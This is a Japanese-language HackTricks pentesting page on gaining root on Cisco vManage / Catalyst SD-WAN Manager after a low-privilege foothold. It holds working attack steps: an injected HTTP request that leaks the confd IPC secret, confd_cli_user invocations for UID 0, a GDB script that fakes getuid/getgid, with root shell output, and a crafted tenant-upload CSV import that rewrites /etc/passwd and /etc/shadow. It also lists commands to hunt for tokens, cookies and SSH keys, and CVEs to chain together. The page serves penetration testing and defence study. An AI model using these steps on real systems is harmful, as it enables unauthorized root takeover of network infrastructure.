# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Cisco vManage / *Catalyst SD-WAN Manager* 上で `vmanage`、`netadmin`、または `vmanage-admin` として code execution を得たら、最も興味深い local privesc の対象は通常 `confd` CLI stack、`cmdptywrapper` ヘルパー、localhost REST APIs、そして root-owned の import/upload handlers です。

コントローラ上でまだ **initial foothold** が必要な場合は、まず専用の control-plane ページを確認してください:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
`/etc/confd/confd_ipc_secret` が foothold から読み取り可能なら、Path 1 と Path 2 はすぐに実用的になります。remote info leak や webshell 経由で到達した場合は、`vmanage-admin` の SSH material や multitenancy upload handlers にすでに到達できるかどうかも確認してください。2026 年の調査では、どちらも現実的な足がかりであることが示されました。

## Path 1

(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

`confd` と各種 binary に関するいくつかの [documentation](http://66.218.245.39/doc/html/rn03re18.html) を少し掘り下げたところ（Cisco の website の account でアクセス可能）、IPC socket の認証には `/etc/confd/confd_ipc_secret` にある secret を使っていることが分かりました:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Neo4j インスタンスを覚えていますか？ それは `vmanage` ユーザーの権限で実行されているため、前の脆弱性を使ってファイルを取得できます：
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` プログラムはコマンドライン引数をサポートしていませんが、引数付きで `/usr/bin/confd_cli_user` を呼び出します。なので、`/usr/bin/confd_cli_user` を自分の引数セットで直接呼び出せます。ただし、現在の権限では読み取りできないため、rootfs から取得して `scp` でコピーし、ヘルプを読んで、それを使って shell を取得する必要があります:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

synacktivチームのblog¹では、root shellを取得する巧妙な方法が説明されていたが、注意点として、`/usr/bin/confd_cli_user` のコピーを入手する必要があり、これはrootのみが読み取り可能である。私は、そこまで面倒な手順なしでrootに権限昇格する別の方法を見つけた。

`/usr/bin/confd_cli` binary を逆コンパイルしたとき、以下を確認した:

<details>
<summary>UID/GID収集を示すObjdump</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

`ps aux` を実行すると、以下が確認できました（_note -g 100 -u 107_）
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
私は、“confd_cli” プログラムが、ログイン中のユーザーから収集したユーザー ID とグループ ID を “cmdptywrapper” アプリケーションに渡していると仮定しました。

最初の試みでは、“cmdptywrapper” を直接実行し、`-g 0 -u 0` を指定してみましたが、失敗しました。途中のどこかでファイルディスクリプタ（-i 1015）が作成されており、それを偽装することができないようです。

synacktiv の blog（最後の例）で述べられているように、“confd_cli” プログラムはコマンドライン引数をサポートしていませんが、デバッガを使って影響を与えることはでき、幸いシステムには GDB が含まれています。

私は、API `getuid` と `getgid` が 0 を返すように強制する GDB スクリプトを作成しました。すでに deserialization RCE によって “vmanage” 権限を得ているため、`/etc/confd/confd_ipc_secret` を直接読む権限があります。

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
<details>
<summary>コンソール出力</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Ciscoは後に、[CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) に関する自社の advisory で、よりクリーンな local root path を文書化した。**read-only privileges のみを持つ authenticated attacker** が、manager CLI に細工した request を送信し、input validation が不十分なため root に到達できた。

offensive の観点から見ると、重要な takeaway は次のとおり:

1. box 上で *any* low-priv foothold を得たら、Path 1 / Path 2 の重い workflow に進む前に local CLI service を test すべき。
2. Path 2 の artifacts を再利用して trust boundary を見つける: `confd_cli` → `cmdptywrapper` → `vshell`。
3. CLI backend に forwarded されるすべての field を suspicious とみなす: UID/GID、username、terminal metadata、imported files、または後で root-owned helper に consumed される任意の value。
4. low-priv user が local CLI socket に reach でき、これらの fields に influence できるなら、root はたった 1 つの crafted request の先にあるかもしれない。

appliance に landed した後の practical workflow は次のとおり:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
これは 2025 年の bug を、同様のバージョンに対する良い hunting pattern に変えます: **ユーザーランドで identity を収集し、それをより権限の高い wrapper に渡す local CLI shims** を探してください。

**CVE-2025-20122** と、その後の **CVE-2026-20122** を混同しないでください: 2025 の issue は *local* な CLI-to-root bug ですが、2026 の issue は *remote* な API arbitrary file overwrite で、主に foothold を植え付けてから Path 1 / Path 2 / Path 4 を再訪するのに有用です。

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco の 2026 年 2 月の advisory では、もう 1 つ有用な privesc クラスも紹介されました: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) は、REST API における不十分な user-authentication mechanism のため、**認証済みの低権限 local attacker** が root を取得することを可能にしました。

これは、vManage の privesc がもはや `confd`/TTY abuse に限定されないため重要です。低権限シェルを取った後は、次も探してください:

- caller を信用しすぎる localhost-only API endpoints
- 現在の account から読める tokens, cookies, または service credentials
- `dataservice`/REST handlers 経由で公開されている root-only actions で、local からでも still triggered できるもの

実際には、`vmanage` や他の service user として shell を得た後は、local API abuse の方が interactive な CLI abuse より静かで、automate もしやすいことが多いです:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
ローカルセッションコンテキストで privileged な REST 機能に到達できるなら、API path を優先してください: stolen web sessions や API tokens と組み合わせて、replay、script、chain しやすいです。

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

もう1つの最近のパターンは [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx) です: `netadmin` 権限を持つ local attacker が **crafted file** を upload でき、その後 CLI がそれを unsafe に処理し、`root` として command injection につながりました。

HackTricks の観点では、この valuable technique は特定の CVE よりも広い意味を持ちます:

1. file を受け付けるすべての CLI または web workflow を enumerate します: imports, diagnostic bundles, templates, validators, backups, tenant data, etc.
2. upload された file がどこに置かれ、どの root-owned script または binary がそれを consume するかを trace します。
3. filename, file content, parsed metadata が shell commands, wrapper scripts, または `system()`-style helpers に渡されることがあるかを test します。
4. すでに `netadmin` に到達できるなら (valid creds, stolen session, or an auth-bypass chain)、file-processing bugs はしばしば root への最短経路です。

Google Cloud / Mandiant は後に、この bug class の非常に具体的な事例が multitenancy import path を通じて exploit されていたことを示しました:
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
観測された攻撃では、細工された CSV により `/etc/passwd` と `/etc/shadow` が変更され、一時的な UID 0 アカウント (`troot`) が作成されました。これにより、`tenant-upload` / `tenant-list` のような importer は特に興味深いものになります。これらは単なるデータ取り込み機能ではなく、root 所有の parser front-end となり得ます。

手早い shell 側の探索パターンは次のとおりです:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
この bug class は、特に `root` ではなく `netadmin` を与える remote footholds とよく chain できます。

## その他の最近の vManage/Catalyst SD-WAN Manager の chain 対象 vuln

- **Unauthenticated info leak (CVE-2026-20133)** – 特に価値が高いのは、公開 research により `confd_ipc_secret` または `vmanage-admin` の private key を露出でき、read bug を Path 1 か NETCONF pivot のどちらかに変えられることが示されたため。
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – 上記の 2025 CLI bug とは別物。VulnCheck はこれを使って webshell を upload し、その結果としてこのページの local privesc path がすぐに relevant になる。
- **Authenticated UI XSS (CVE-2024-20475)** – web UI で admin session を steal し、その後 API/CLI action に pivot して最終的に `vshell` か、上記の local privesc path のいずれかに到達する。
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Path 5 に対する非常に強力な precursor。なぜなら `netadmin` は 2026 crafted-file privesc に必要な正確な level だから。
- **Authenticated arbitrary file write (CVE-2026-20262)** – 攻撃上の価値は CVE-2026-20122 に近いが、より後段の web UI upload path 経由。root か management-plane web tier によって後で parse される location に write する。
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – 2026 の intrusions では、攻撃者が古い vulnerable な SD-WAN build に roll back し、旧 CLI root bug を abuse してから元の version を restore できることが示された。
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – 専用の SD-WAN control-plane ページでより詳しく説明されている。`vmanage-admin` 用の SSH key を append できるため、このページを再度確認するのに必要な local foothold を得られる。



## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
